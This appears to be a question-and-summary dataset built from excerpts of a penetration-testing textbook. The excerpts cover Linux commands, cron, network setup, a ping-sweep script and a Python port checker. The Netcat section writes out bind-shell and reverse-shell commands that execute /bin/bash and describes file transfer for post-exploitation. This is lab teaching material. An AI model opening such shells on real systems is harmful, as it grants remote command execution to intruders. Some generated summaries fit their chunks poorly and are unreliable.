changes,\nas shown here:\n--snip--\nSave modified buffer (ANSWERING \"No\" WILL DESTROY CHANGES) ? Y\nY Yes\nN No ^C Cancel\nEnter Y to save the file. Now we’ll edit the file with the vi editor. Editing a File with vi\nAdd the text in Listing 2-5 to testfile.txt. In addition to the contents of the\nfile, at the bottom of the vi screen you see some information including the\nfilename, number of lines, and the current cursor position (see Listing 2-5).",
    "question": "What are the key steps involved in setting up a virtual lab environment with Kali Linux, Windows 7, and Ubuntu, including configuring the network, setting up user accounts, and installing necessary software and applications?",
    "summary": "This chapter covers setting up a virtual lab with Kali Linux, configuring network settings, adding a user account, and learning basic Linux commands. It also explains how to create, edit, and manage files, as well as understand file permissions. The setup includes configuring Windows 7 to be part of two networks and installing necessary software for penetration testing."
  },
  {
    "start": 20,
    "end": 22,
    "text": "root@kali:~/mydirectory# vi testfile.txt\nhi\ngeorgia\nwe\nare\nteaching\npentesting\ntoday\n~\n\"testfile.txt\" 7L, 46C 1,1\nAll\nListing 2-5: Editing files with vi\nUsing Kali Linux 63\nUnlike nano, you can’t just start editing the file once it is opened in vi. To edit a file, enter I to put vi into insert mode. You should see the word\nINSERT displayed at the bottom of your terminal. Once you’ve finished\nmaking changes, press esc to exit insert mode and return to command\nmode. Once in command mode, you can use commands to edit your text. For example, position the cursor at the line we and enter dd to delete the\nword we from the file. To exit vi, enter :wq to tell vi to write the changes to the file and quit,\nas shown in Listing 2-6. hi\ngeorgia\nare\nteaching\npentesting\ntoday\n:wq\nListing 2-6: Saving changes in vi\nnote To learn more about available commands for vi and nano, read the corresponding\nman pages. Which editor you use daily is up to you. Throughout this book we’ll use\nnano to edit files, but feel free to substitute your editor of choice. data manipulation\nNow for a bit of data manipulation. Enter the text in Listing 2-7 in myfile\nusing your desired text editor. The file lists some of my favorite security\nconferences and the months when they typically happen. root@kali:~/mydirectory# cat myfile\n1 Derbycon September\n2 Shmoocon January\n3 Brucon September\n4 Blackhat July\n5 Bsides *\n6 HackerHalted October\n7 Hackcon April\nListing 2-7: Example list for data manipulation\n64 Chapter 2\nUsing grep\nThe command grep looks for instances of a text string in a file. For example,\nto search for all instances of the string September in our file, enter grep\nSeptember myfile as follows. root@kali:~/mydirectory# grep September myfile\n1 Derbycon September\n3 Brucon September\nAs you can see, grep tells us that Derbycon and Brucon are in September. Now suppose you want only the names of the conferences in Septem-\nber but not the number or the month. You can send the output of grep to\nanother command for additional processing using a pipe (|). The cut com-\nmand allows you to take each line of input, choose a delimiter, and print\nspecific fields. For example, to get just the names of conferences that run in\nSeptember you can grep for the word September as you did previously. Next,\nyou pipe (|) the output to cut, where you specify a space as the delimiter\nwith the -d option and say you want the second field with the field (-f)\noption, as shown here. root@kali:~/mydirectory# grep September myfile | cut -d \" \" -f 2\nDerbycon\nBrucon\nThe result, as you can see, is that by piping the two commands together\nyou get just the conferences Derbycon and Brucon. Using sed\nAnother command for manipulating data is sed. Entire books have been\nwritten about using sed, but we’ll cover just the basics here with a simple\nexample of finding a specific word and replacing it. The sed command is ideal for editing files automatically based on cer-\ntain patterns or expressions. Say, for instance, you have a very long file,\nand you need to replace every instance of a certain word. You can do this\nquickly and automatically with the sed command. In the language of sed, a slash (/) is the delimiter character. For\nexample, to replace all instances of the word Blackhat with Defcon in myfile,\nenter sed 's/Blackhat/Defcon/' myfile, as shown in Listing 2-8. root@kali:~/mydirectory# sed 's/Blackhat/Defcon/' myfile\n1 Derbycon September\n2 Shmoocon January\n3 Brucon September\n4 Defcon July\n5 Bsides *\n6 HackerHalted October\n7 Hackcon April\nListing 2-8: Replacing words with sed\nUsing Kali Linux 65\nPattern Matching with awk\nAnother command line utility for pattern matching is the awk command. For example, if you want to find conferences numbered 6 or greater, you\ncan use awk to search the first field for entries greater than 5, as shown here. root@kali:~/mydirectory# awk '$1 >5' myfile\n6 HackerHalted October\n7 Hackcon April\nOr, if you want only the first and third words in every line, you can\nenter awk '{print $1,$3;}' myfile, as shown in Listing 2-9. root@kali:~/mydirectory# awk '{print $1,$3;}' myfile\n1 September\n2 January\n3 September\n4 July\n5 *\n6 October\n7 April\nListing 2-9: Selecting certain columns with awk\nnote We’ve looked at only simple examples of using these data manipulation utilities in\nthis section. To get more information, consult the man pages. These utilities can be\npowerful time-savers. managing installed Packages\nOn Debian-based Linux distributions such as Kali Linux, you can use the\nAdvanced Packaging Tool (apt) to manage packages. To install a package,\nenter apt-get install package. For example, to install Raphael Mudge’s front-\nend for Metasploit, Armitage, in Kali Linux, enter the following:\nroot@kali:~# apt-get install armitage\nIt’s that easy: apt installs and configures Armitage for you. Updates are regularly released for the tools installed on Kali Linux. To\nget the latest versions of the packages already installed, enter apt-get upgrade. The repositories Kali uses for packages are listed in the file /etc/apt/sources\n.list. To add additional repositories, you can edit this file and then run\nthe command apt-get update to refresh the database to include the new\nrepositories. 66 Chapter 2\nnote This book is built off the base install of Kali 1.0.6 unless otherwise noted in\nChapter 1, so in order to follow along with the book as is, don’t update Kali. Processes and services\nIn Kali Linux you can start, stop, or restart services using the service com-\nmand. For example, to start the Apache web server, enter service apache2\nstart as shown next. root@kali:~/mydirectory# service apache2 start\n[....] Starting web server: apache2: Could not reliably determine the server's\nfully qualified domain name, using 127.0.1.1 for ServerName\n. ok\nLikewise, to stop the MySQL database server, enter service mysql stop. managing networking\nWhen setting up the Kali Linux virtual machines in Chapter 1, you\nused the ifconfig command to view network information as shown in\nListing 2-10. root@kali:~# ifconfig\neth0u Link encap:Ethernet HWaddr 00:0c:29:df:7e:4d\ninet addr:192.168.20.9v Bcast:192.168.20.255 Mask:255.255.255.0w\ninet6 addr: fe80::20c:29ff:fedf:7e4d/64 Scope:Link\nUP BROADCAST RUNNING MULTICAST MTU:1500 Metric:1\nRX packets:1756332 errors:930193 dropped:17 overruns:0 frame:0\nTX packets:1115419 errors:0 dropped:0 overruns:0 carrier:0\ncollisions:0 txqueuelen:1000\nRX bytes:1048617759 (1000.0 MiB) TX bytes:115091335 (109.7 MiB)\nInterrupt:19 Base address:0x2024\n--snip--\nListing 2-10: Viewing networking information with ifconfig\nFrom the output of ifconfig you can glean a lot of information about\nyour system’s network state. For one, the network interface is called eth0 u. The IPv4 address (inet addr) that my Kali box uses to talk to the network\nis 192.168.20.9 v (yours will probably differ). An IP address is a 32-bit label\nassigned to devices in a network. The IP address is named up of 4 octets,\nor 8-bit parts. Using Kali Linux 67\nThe address’s network mask, or netmask (Mask), at w identifies which parts\nof the IP address are part of the network and which parts belong to the\nhost. In this case the netmask 255.255.255.0 tells you that the network is the\nfirst three octets, 192.168.20. The default gateway is where your host routes traffic to other networks. Any traffic destined outside the local network will be sent to the default\ngateway for it to figure out where it needs to go. root@kali:~# route\nKernel IP routing table\nDestination Gateway Genmask Flags Metric Ref Use Iface\ndefault 192.168.20.1u 0.0.0.0 UG 0 0 0 eth0\n\n192.168.20.0 * 255.255.255.0 U 0 0 0 eth0\nThe route command output tells us that the default gateway is\n\n192.168.20.1 u. This makes sense because the system with the IP\naddress 192.168.20.1 is the wireless router in my home network. Take\nnote of your own default gateway for use in the following section. Setting a Static IP Address\nBy default, your network connection uses dynamic host configuration\nprotocol (DHCP) to pull an IP address from the network. To set a static\naddress, so that your IP address won’t change, you need to edit the file\n/etc/network/interfaces. Use your preferred editor to open this file. The\ndefault configuration file is shown in Listing 2-11. # This file describes the network interfaces available on your system\n# and how to activate them. For more information, see interfaces(5). # The loopback network interface\nauto lo\niface lo inet loopback\nListing 2-11: The default /etc/network/interfaces file\nTo give your system a static IP address you need to add an entry for the\neth0 interface. Add the text shown in Listing 2-12 to /etc/network/interfaces\nwith the IP addresses changed to match your environment. # This file describes the network interfaces available on your system\n# and how to activate them. For more information, see interfaces(5). # The loopback network interface\nauto lo\niface lo inet loopback\nauto eth0\niface eth0 inet static u\naddress 192.168.20.9\n68 Chapter 2\nnetmask 255.255.255.0 v\ngateway 192.168.20.1 w\nListing 2-12: Adding a static IP address\nYou set the IP address for eth0 as static at u. Use the IP address, net-\nmask , and gateway  you found in the previous section to fill in the\ninformation in your file. Once you’ve made these changes, restart networking with service\nnetworking restart so that the newly added static networking information\nwill be used. Viewing Network Connections\nTo view network connections, listening ports, and so on, use the netstat\ncommand. For example, you can see the programs listening on TCP ports\nby issuing the command netstat -antp, as shown in Listing 2-13. Ports are\nsimply software-based network sockets that listen on the network to allow\nremote systems to interact with programs on a system. root@kali:~/mydirectory# netstat -antp\nActive Internet connections (servers and established)\nProto Recv-Q Send-Q Local Address Foreign Address State\nPID/Program name\ntcp6 0 0 :::80 :::* LISTEN\n15090/apache2\nListing 2-13: Using netstat to view listening ports\nYou see that the Apache web server you started earlier in the chapter is\nlistening on TCP port 80. (See the man page for other netstat options.)\nnetcat: the swiss army knife of tCP/iP Connections\nAs the man page notes, the Netcat tool is known as the Swiss Army knife\nfor TCP/IP connections. It’s a versatile tool that we’ll utilize throughout\nthis book. To see Netcat’s various options enter nc -h, as shown in Listing 2-14. root@kali:~# nc -h\n[v1.10-40]\nconnect to somewhere: nc [-options] hostname port[s] [ports] ... listen for inbound: nc -l -p port [-options] [hostname] [port]\noptions:\n-c shell commands as `-e'; use /bin/sh to exec [dangerous!!]\n-e filename program to exec after connect [dangerous!!]\n-b allow broadcasts\n--snip--\nListing 2-14: Netcat help information\nUsing Kali Linux 69\nCheck to See If a Port Is Listening\nLet’s have Netcat connect to a port to see if that port is listening for connec-\ntions. You saw previously that the Apache web server is listening on port 80\non your Kali Linux system. Tell Netcat to attach to port 80 verbosely, or out-\nput rich, with the -v option as shown next. If you started Apache correctly,\nyou should see the following when attempting to connect the service. root@kali:~# nc -v 192.168.20.9 80\n(UNKNOWN) [192.168.20.10] 80 (http) open\nAs you can see, Netcat reports that port 80 is indeed listening (open) on\nthe network. (We’ll look more at open ports and why they are interesting in\nChapter 5’s discussion of port scanning.)\nYou can also listen on a port for an incoming connection using Netcat,\nas shown next. root@kali:~# nc -lvp 1234\nlistening on [any] 1234 ... You use the options l for listen, v for verbose, and p to specify the port\nto listen on. Next, open a second terminal window and use Netcat to connect to the\nNetcat listener. root@kali:~# nc 192.168.20.9 1234\nhi georgia\nOnce you connect, enter the text hi georgia, and when you return to the\nlistener’s terminal window, you see that a connection was received and your\ntext was printed. listening on [any] 1234 ... connect to [192.168.20.9] from (UNKNOWN) [192.168.20.9] 51917\nhi georgia\nClose down both Netcat processes by pressing ctrl-C. Opening a Command Shell Listener\nNow for something a bit more interesting. When you set up your Netcat\nlistener, use the -e flag to tell Netcat to execute /bin/bash (or start a Bash\ncommand prompt) when a connection is received. This allows anyone who\nconnects to the listener to execute commands on your system, as shown next. root@kali:~# nc -lvp 1234 -e /bin/bash\nlistening on [any] 1234 ... Again, use a second terminal window to connect to the Netcat listener. 70 Chapter 2\nroot@kali:~# nc 192.168.20.9 1234\nwhoami\nroot\nYou can now issue Linux commands to be executed by the Netcat lis-\ntener. The whoami Linux command will tell you the current logged-in user. In this case, because the Netcat process was started by the root user, your\ncommands will be executed as root. note This is a simple example because both your Netcat listener and the connection are on\nthe same system. You could use another of your virtual machines, or even your host\nsystem, for this exercise as well. Close down both Netcat processes again. Pushing a Command Shell Back to a Listener\nIn addition to listening on a port with a command shell, you can also push\na command shell back to a Netcat listener. This time set up the Netcat lis-\ntener without the -e flag as shown next. root@kali:~# nc -lvp 1234\nlistening on [any] 1234 ... Now open a second terminal, and connect back to the Netcat listener\nyou just created as shown here. root@kali:~# nc 192.168.20.9 1234 -e /bin/bash\nConnect with Netcat as usual, but this time use the -e flag to execute\n/bin/bash on the connection. Back in your first terminal you see a connec-\ntion as shown next, and if you enter terminal commands, you will see them\nexecuted. (We’ll learn more about listening with /bin/bash on a local port\nand actively pushing /bin/bash with a connection, known as bind shells and\nreverse shells, respectively, in Chapter 4.)\nlistening on [any] 1234 ... connect to [192.168.20.9] from (UNKNOWN) [192.168.20.9] 51921\nwhoami\nroot\nNow, one more thing with Netcat. This time, instead of outputting what\ncomes into your listener to the screen, use > to send it to a file as shown next. root@kali:~# nc -lvp 1234 > netcatfile\nlistening on [any] 1234 ... In the second terminal you set up Netcat to connect, but this time you\nuse the < symbol to tell it to send the contents of a file (myfile) over the\nUsing Kali Linux 71\nNetcat connection. Give Netcat a second or two to finish, and then examine\nthe contents of the file netcatfile created by your first Netcat instance. The\ncontents should be identical to myfile. root@kali:~# nc 192.168.20.9 1234 < mydirectory/myfile\nYou have used Netcat to transfer the file. In this case we’ve simply trans-\nferred the file from one directory to another, but you can imagine how this\ntechnique can be used to transfer files from system to system—a technique\nthat often comes in handy in the post-exploitation phase of a pentest, once\nyou have access to a system. automating tasks with cron Jobs\nThe cron command allows us to schedule tasks to automatically run at a\nspecified time. In the /etc directory in Kali, you can see several files and\ndirectories related to cron, as shown in Listing 2-15. root@kali:/etc# ls | grep cron\ncron.d\ncron.daily\ncron.hourly\ncron.monthly\ncrontab\ncron.weekly\nListing 2-15: crontab files\nThe cron.daily, cron.hourly, cron.monthly, and cron.weekly directories spec-\nify scripts that will run automatically, every day, every hour, every month, or\nevery week, depending on which directory you put your script in. If you need more flexibility you can edit cron’s configuration file, /etc/\ncrontab. The default text is shown in Listing 2-16. # /etc/crontab: system-wide crontab\n# Unlike any other crontab you don't have to run the `crontab'\n# command to install the new version when you edit this file\n# and files in /etc/cron.d. These files also have username fields,\n# that none of the other crontabs do. SHELL=/bin/sh\nPATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin\n# m h dom mon dow user command\n17 * * * * root cd / && run-parts --report /etc/cron.hourly u\n25 6 * * * root test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily ) v\n47 6 * * 7 root test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )\n52 6 1 * * root test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )\n#\nListing 2-16: crontab configuration file\n72 Chapter 2\nThe fields in a crontab are, from left to right, the minute, hour, day of\nthe month, month, day of the week, user who will run the command, and,\nfinally, the command to be run. To run a command every day of the week,\nevery hour, and so on, you use an asterisk (*) instead of specifying a value\nfor the column. For example, look at the first crontab line at u, which runs the hourly\ncron jobs specified in /etc/cron.hourly. This crontab runs on the 17th minute\nof every hour every day of every month on every day of the week. The line\nat v says that the daily crontab (/etc/cron.daily) will be run at the 25th min-\nute of the 6th hour of every day of every month on every day of the week. (For\nmore flexibility, you can add a line here instead of adding to the hourly, daily,\nweekly, or monthly lists.)\nsummary\nIn this chapter we’ve looked at some common Linux tasks. Navigating the\nLinux filesystem, working with data, and running services are all skills that\nwill serve you well as you move through the rest of this book. In addition,\nwhen attacking Linux systems, knowing which commands to run in a Linux\nenvironment will help you make the most of successful exploitation. You\nmay want to automatically run a command periodically by setting up a cron\njob or use Netcat to transfer a file from your attack machine. You will use\nKali Linux to run your attacks throughout this book, and one of your target\nsystems is Ubuntu Linux, so having the basics in place will make learning\npentesting come more naturally. Using Kali Linux 73\n3\nProgr amming\nIn this chapter we will look at some basic examples\nof computer programming. We will look at writing\nprograms to automate various useful tasks in multiple\nprogramming languages. Even though we use prebuilt\nsoftware for the majority of this book, it is useful to be\nable to create your own programs. Bash scripting\nIn this section we’ll look at using Bash scripts to run several commands\nat once. Bash scripts, or shell scripts, are files that include multiple terminal\ncommands to be run.",
    "question": "What are some common Linux tasks covered in this section and how can they be accomplished using tools like vi, grep, cut, sed, awk, and cron?",
    "summary": "This chapter covers basic programming examples in multiple languages to automate tasks, emphasizing the importance of creating custom programs alongside using prebuilt tools. It focuses on Bash scripting for running multiple commands and explains how to use tools like Netcat for file transfer and cron jobs for scheduling tasks. The text also highlights the use of Kali Linux for penetration testing and the importance of understanding Linux commands for effective exploitation."
  },
  {
    "start": 23,
    "end": 25,
    "text": "Any command we can run in a terminal can be run\nin a script. Ping\nWe’ll call our first script pingscript.sh. When it runs, this script will perform\na ping sweep on our local network that sends Internet Control Message\nProtocol (ICMP) messages to remote systems to see if they respond. We’ll use the ping tool to determine which hosts are reachable on a net-\nwork. (Although some hosts may not respond to ping requests and may be\nup despite not being “pingable,” a ping sweep is still a good place to start.)\nBy default, we supply the IP address or hostname to ping. For example, to\nping our Windows XP target, enter the bold code in Listing 3-1. root@kali:~/# ping 192.168.20.10\nPING 192.168.20.10 (192.168.20.10) 56(84) bytes of data. 64 bytes from 192.168.20.10: icmp_req=1 ttl=64 time=0.090 ms\n64 bytes from 192.168.20.10: icmp_req=2 ttl=64 time=0.029 ms\n64 bytes from 192.168.20.10: icmp_req=3 ttl=64 time=0.038 ms\n64 bytes from 192.168.20.10: icmp_req=4 ttl=64 time=0.050 ms\n^C\n--- 192.168.20.10 ping statistics ---\n4 packets transmitted, 4 received, 0% packet loss, time 2999 ms\nrtt min/avg/max/mdev = 0.029/0.051/0.090/0.024 ms\nListing 3-1: Pinging a remote host\nWe can tell from the ping output that the Windows XP target is up\nand responding to ping probes because we received replies to our ICMP\nrequests. (The trouble with ping is that it will keep running forever unless\nyou stop it with ctrl-C.)\nA Simple Bash Script\nLet’s begin writing a simple Bash script to ping hosts on the network. A good\nplace to start is by adding some help information that tells your users how\nto run your script correctly. #!/bin/bash\necho \"Usage: ./pingscript.sh [network]\"\necho \"example: ./pingscript.sh 192.168.20\"\nThe first line of this script tells the terminal to use the Bash interpreter. The next two lines that begin with echo simply tell the user that our ping\nscript will take a command line argument (network), telling the script which\nnetwork to ping sweep (for example, 192.168.20). The echo command will\nsimply print the text in quotes. note This script implies we are working with a class C network, where the first three octets\nof the IP address make up the network. After creating the script, use chmod to make it executable so we can run it. root@kali:~/# chmod 744 pingscript.sh\n76 Chapter 3\nRunning Our Script\nPreviously, when entering Linux commands, we typed the command\nname at the prompt. The filesystem location of built-in Linux commands\nas well as pentest tools added to Kali Linux are part of our PATH environ-\nmental variable. The PATH variable tells Linux which directories to search\nfor executable files. To see which directories are included in our PATH,\nenter echo $PATH. root@kali:~/# echo $PATH\n/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\nNotice in the output that the /root directory is not listed. That means that\nwe won’t be able to simply enter pingscript.sh to run our Bash script. Instead\nwe’ll enter ./pingscript.sh to tell the terminal to run the script from our\ncurrent directory. As shown next, the script prints the usage information. root@kali:~/# ./pingscript.sh\nUsage: ./pingscript.sh [network]\nexample: ./pingscript.sh 192.168.20\nAdding Functionality with if Statements\nNow let’s add in a bit more functionality with an if statement, as shown in\nListing 3-2. #!/bin/bash\nif [ \"$1\" == \"\" ] u\nthen v\necho \"Usage: ./pingscript.sh [network]\"\necho \"example: ./pingscript.sh 192.168.20\"\nfi w\nListing 3-2: Adding an if statement\nTypically a script needs to print usage information only if the user\nuses it incorrectly. In this case, the user needs to supply the network to\nscan as a command line argument. If the user fails to do so, we want to\ninform the user how to run our script correctly by printing the usage\ninformation. To accomplish this, we can use an if statement to see if a condition is\nmet. By using an if statement, we can have our script echo the usage infor-\nmation only under certain conditions—for example, if the user does not\nsupply a command line argument. The if statement is available in many programming languages, though\nthe syntax varies from language to language. In Bash scripting, an if state-\nment is used like this: if [condition], where condition is the condition that\nmust be met. Programming 77\nIn the case of our script, we first see whether the first command line\nargument is null u. The symbol $1 represents the first command line argu-\nment in a Bash script, and double equal signs (==) check for equality. After\nthe if statement, we have a then statement v. Any commands between the\nthen statement and the fi (if backward) w are executed only if the condi-\ntional statement is true—in this case, when the first command line argu-\nment to the script is null. When we run our new script with no command line argument, the if\nstatement evaluates as true, because the first command line argument is\nindeed null, as shown here. root@kali:~/# ./pingscript.sh\nUsage: ./pingscript.sh [network]\nexample: ./pingscript.sh 192.168.20\nAs expected we see usage information echoed to the screen. A for Loop\nIf we run the script again with a command line argument, nothing hap-\npens. Now let’s add some functionality that is triggered when the user runs\nthe script with the proper arguments, as shown in Listing 3-3. #!/bin/bash\nif [ \"$1\" == \"\" ]\nthen\necho \"Usage: ./pingscript.sh [network]\"\necho \"example: ./pingscript.sh 192.168.20\"\nelse u\nfor x in `seq 1 254`; do v\nping -c 1 $1.$x\ndone w\nfi\nListing 3-3: Adding a for loop\nAfter our then statement, we use an else statement u to instruct the\nscript to run code when the if statement evaluates as false—in this case, if\nthe user supplies a command line argument. Because we want this script\nto ping all possible hosts on the local network, we need to loop through\nthe numbers 1 through 254 (the possibilities for the final octet of an\nIP version 4 address) and run the ping command against each of these\npossibilities. An ideal way to run through sequential possibilities is with a for loop v. Our for loop, for x in `seq 1 254`; do, tells the script to run the code that\nfollows for each number from 1 to 254. This will allow us to run one set of\ninstructions 254 times rather than writing out code for each instance. We\ndenote the end of a for loop with the instruction done w. 78 Chapter 3\nInside the for loop, we want to ping each of the IP addresses in the net-\nwork. Using ping’s man page, we find that the -c option will allow us to limit\nthe number of times we ping a host. We set -c to 1 so that each host will be\npinged just once. To specify which host to ping, we want to concatenate the first command\nline argument (which denotes the first three octets) with the current itera-\ntion of the for loop. The full command to use is ping -c 1 $1.$x. Recall\nthat the $1 denotes the first command line argument, and $x is the cur-\nrent iteration of the for loop. The first time our for loop runs, it will ping\n\n192.168.20.1, then 192.168.20.2, all the way to 192.168.20.254. After itera-\ntion 254, our for loop finishes.\nWhen we run our script with the first three octets of our IP address as\nthe command line argument, the script pings each IP address in the net-\nwork as shown in Listing 3-4.\nroot@kali:~/# ./pingscript.sh 192.168.20\nPING 192.168.20.1 (192.168.20.1) 56(84) bytes of data.\n64 bytes from 192.168.20.1: icmp_req=1 ttl=255 time=8.31 ms u\n--- 192.168.20.1 ping statistics ---\n1 packets transmitted, 1 received, 0% packet loss, time 0ms\nrtt min/avg/max/mdev = 8.317/8.317/8.317/0.000 ms\nPING 192.168.20.2(192.168.20.2) 56(84) bytes of data.\n64 bytes from 192.168.20.2: icmp_req=1 ttl=128 time=166 ms\n--- 192.168.20.2 ping statistics ---\n1 packets transmitted, 1 received, 0% packet loss, time 0ms\nrtt min/avg/max/mdev = 166.869/166.869/166.869/0.000 ms\nPING 192.168.20.3 (192.168.20.3) 56(84) bytes of data.\nFrom 192.168.20.13 icmp_seq=1 Destination Host Unreachable v\n--- 192.168.20.3 ping statistics ---\n1 packets transmitted, 0 received, +1 errors, 100% packet loss, time 0ms\n--snip--\nListing 3-4: Running the ping sweep script\nYour results will vary based on the systems in your local network. Based\non this output, I can tell that in my network, the host 192.168.20.1 is up, and\nI received an ICMP reply u. On the other hand, the host 192.168.20.3 is not\nup, so I received a host unreachable notification v.\nStreamlining the Results\nAll this information printed to screen is not very nice to look at, and anyone\nwho uses our script will need to sift through a lot of information to deter-\nmine which hosts in the network are up. Let’s add some additional func-\ntionality to streamline our results.\nProgramming 79\nIn the previous chapter we covered grep, which searches for and\nmatches specific patterns. Let’s use grep to filter the script’s output, as\nshown in Listing 3-5.\n#!/bin/bash\nif [ \"$1\" == \"\" ]\nthen\necho \"Usage: ./pingscript.sh [network]\"\necho \"example: ./pingscript.sh 192.168.20\"\nelse\nfor x in `seq 1 254`; do\nping -c 1 $1.$x | grep \"64 bytes\" u\ndone\nfi\nListing 3-5: Using grep to filter results\nHere we look for all instances of the string 64 bytes u, which occurs\nwhen an ICMP reply is received when pinging a host. If we run the script\nwith this change, we see that only lines that include the text 64 bytes are\nprinted to the screen, as shown here.\nroot@kali:~/# ./pingscript.sh 192.168.20\n64 bytes from 192.168.20.1: icmp_req=1 ttl=255 time=4.86 ms\n64 bytes from 192.168.20.2: icmp_req=1 ttl=128 time=68.4 ms\n64 bytes from 192.168.20.8: icmp_req=1 ttl=64 time=43.1 ms\n--snip--\nWe get indicators only for live hosts; hosts that do not answer are not\nprinted to the screen.\nBut we can make this script even nicer to work with. The point of our\nping sweep is to get a list of live hosts. By using the cut command discussed\nin Chapter 2, we can print the IP addresses of only the live hosts, as shown in\nListing 3-6.\n#!/bin/bash\nif [ \"$1\" == \"\" ]\nthen\necho \"Usage: ./pingscript.sh [network]\"\necho \"example: ./pingscript.sh 192.168.20\"\nelse\nfor x in `seq 1 254`; do\nping -c 1 $1.$x | grep \"64 bytes\" | cut -d\" \" -f4 u\ndone\nfi\nListing 3-6: Using cut to further filter results\nWe can use a space as the delimiter and grab the fourth field, our IP\naddress, as shown at u.\n80 Chapter 3\nNow we run the script again as shown here.\nroot@kali:~/mydirectory# ./pingscript.sh 192.168.20\n\n192.168.20.1:\n\n192.168.20.2:\n\n192.168.20.8:\n--snip--\nUnfortunately, we see a trailing colon at the end of each line. The results\nwould be clear enough to a user, but if we want to use these results as input\nfor any other programs, we need to delete the trailing colon. In this case,\nsed is the answer.\nThe sed command that will delete the final character from each line is\nsed 's/.$//', as shown in Listing 3-7.\n#!/bin/bash\nif [ \"$1\" == \"\" ]\nthen\necho \"Usage: ./pingscript.sh [network]\"\necho \"example: ./pingscript.sh 192.168.20\"\nelse\nfor x in `seq 1 254`; do\nping -c 1 $1.$x | grep \"64 bytes\" | cut -d\" \" -f4 | sed 's/.$//'\ndone\nfi\nListing 3-7: Using sed to drop the trailing colon\nNow when we run the script, everything looks perfect, as shown here.\nroot@kali:~/# ./pingscript.sh 192.168.20\n\n192.168.20.1\n\n192.168.20.2",
    "question": "What is a Bash script that performs a ping sweep on a local network and filters the results to display only the IP addresses of live hosts?",
    "summary": "This text explains how to create a Bash script that performs a ping sweep on a local network to check which hosts are reachable. The script uses command line arguments to specify the network and loops through IP addresses to send ping requests. It then filters the results using grep, cut, and sed to display only the live hosts."
  },
  {
    "start": 26,
    "end": 28,
    "text": "192.168.20.8\n--snip--\nnote Of course, if we want to output the results to a file instead of to the screen, we can use\nthe >> operator, covered in Chapter 2, to append each live IP address to a file. Try\nautomating other tasks in Linux to practice your Bash scripting skills. Python scripting\nLinux systems typically come with interpreters for other scripting languages\nsuch as Python and Perl. Interpreters for both languages are included in\nKali Linux. In Chapters 16 through 19, we’ll use Python to write our own\nexploit code. For now, let’s write a simple Python script and run it in Kali\nLinux just to demonstrate the basics of Python scripting. Programming 81\nFor this example we’ll do something similar to our first Netcat example\nin Chapter 2: We’ll attach to a port on a system and see if the port is listen-\ning. A starting point for our script is shown here. #!/usr/bin/python u\nip = raw_input(\"Enter the ip: \") v\nport = input(\"Enter the port: \") w\nIn the previous section, the first line of our script told the terminal to\nuse Bash to interpret the script. We do the same thing here, pointing to the\nPython interpreter installed on Kali Linux at /usr/bin/python u. We’ll begin by prompting the user for data and recording input into\nvariables. The variables will store the input for use later in the script. To\ntake input from the user, we can use the Python function raw_input v. We\nwant to save our port as an integer, so we use a similar built-in Python func-\ntion, input, at w. Now we ask the user to input an IP address and a port to test. After saving the file, use chmod to make the script executable before run-\nning the script, as shown here. root@kali:~/mydirectory# chmod 744 pythonscript.py\nroot@kali:~/mydirectory# ./pythonscript.py\nEnter the ip: 192.168.20.10\nEnter the port: 80\nWhen you run the script, you’re prompted for an IP address and a port,\nas expected. Now we will add in some functionality to allow us to use the user’s input\nto connect to the chosen system on the selected port to see if it is open\n(Listing 3-8). #!/usr/bin/python\nimport socket u\nip = raw_input(\"Enter the ip: \")\nport = input(\"Enter the port: \")\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM) v\nif s.connect_ex((ip, port)): w\nprint \"Port\", port, \"is closed\" x\nelse: y\nprint \"Port\", port, \"is open\"\nListing 3-8: Adding port-scanning functionality\nTo perform networking tasks in Python, we can include a library called\nsocket using the command import socket u. The socket library does the heavy\nlifting for setting up a network socket. The syntax for creating a TCP network socket is socket.socket(socket.AF_\nINET, socket.SOCK_STREAM). We set a variable equal to this network socket at v. 82 Chapter 3\nConnecting to a Port\nWhen creating a socket to connect to a remote port, the first candidate\navailable from Python is the socket function connect. However, there is\na better candidate for our purposes in the similar function, connect_ex. According to the Python documentation, connect_ex is like connect except\nthat it returns an error code instead of raising an exception if the connec-\ntion fails. If the connection succeeds, connect_ex will return the value 0. Because we want to know whether the function can connect to the port,\nthis return value seems ideal to feed into an if statement. if Statements in Python\nWhen building if statements in Python, we enter if condition:. In Python the\nstatements that are part of a conditional or loop are denoted with inden-\ntations rather than ending markers, as we saw in Bash scripting. We can\ninstruct our if statement to evaluate the returned value of the connection\nof our TCP socket to the user-defined IP address and port with the com-\nmand if s.connect_ex((ip, port)): w. If the connection succeeds, connect_ex\nwill return 0, which will be evaluated by the if statement as false. If the con-\nnection fails, connect_ex will return a positive integer, or true. Thus, if our if\nstatement evaluates as true, it stands to reason that the port is closed, and\nwe can present this to the user using the Python print command at x. And,\nas in the Bash scripting example, if connect_ex returns 0 at y, we can use an\nelse statement (the syntax is else: in Python) to instead inform the user\nthat the tested port is open. Now, run the updated script to test whether TCP port 80 is running on\nthe Windows XP target host as shown here. root@kali:~/# ./pythonscript.py\nEnter the ip: 192.168.20.10\nEnter the port: 80\nPort 80 is open\nAccording to our script, port 80 is open. Now run the script again\nagainst port 81. root@kali:~/# ./pythonscript.py\nEnter the ip: 192.168.20.10\nEnter the port: 81\nPort 81 is closed\nThis time, the script reports that port 81 is closed. note We will look at checking open ports in Chapter 5, and we will return to Python script-\ning when we study exploit development. Kali Linux also has interpreters for the Perl\nand Ruby languages. We will learn a little bit of Ruby in Chapter 19. It never hurts\nto know a little bit of multiple languages. If you are up for a challenge, see if you can\nre-create this script in Perl and Ruby. Programming 83\nwriting and Compiling C Programs\nTime for one more simple programming example, this time in the C pro-\ngramming language. Unlike scripting languages such as Bash and Python,\nC code must be compiled and translated into machine language that the\nCPU can understand before it is run. Kali Linux includes the GNU Compiler Collection (GCC), which will\nallow us to compile C code to run on the system. Let’s create a simple C pro-\ngram that says hello to a command line argument, as shown in Listing 3-9. #include <stdio.h> u\nint main(int argc, char *argv[]) v\n{\nif(argc < 2) w\n{\nprintf(\"%s\\n\", \"Pass your name as an argument\"); x\nreturn 0; y\n}\nelse\n{\nprintf(\"Hello %s\\n\", argv[1]); z\nreturn 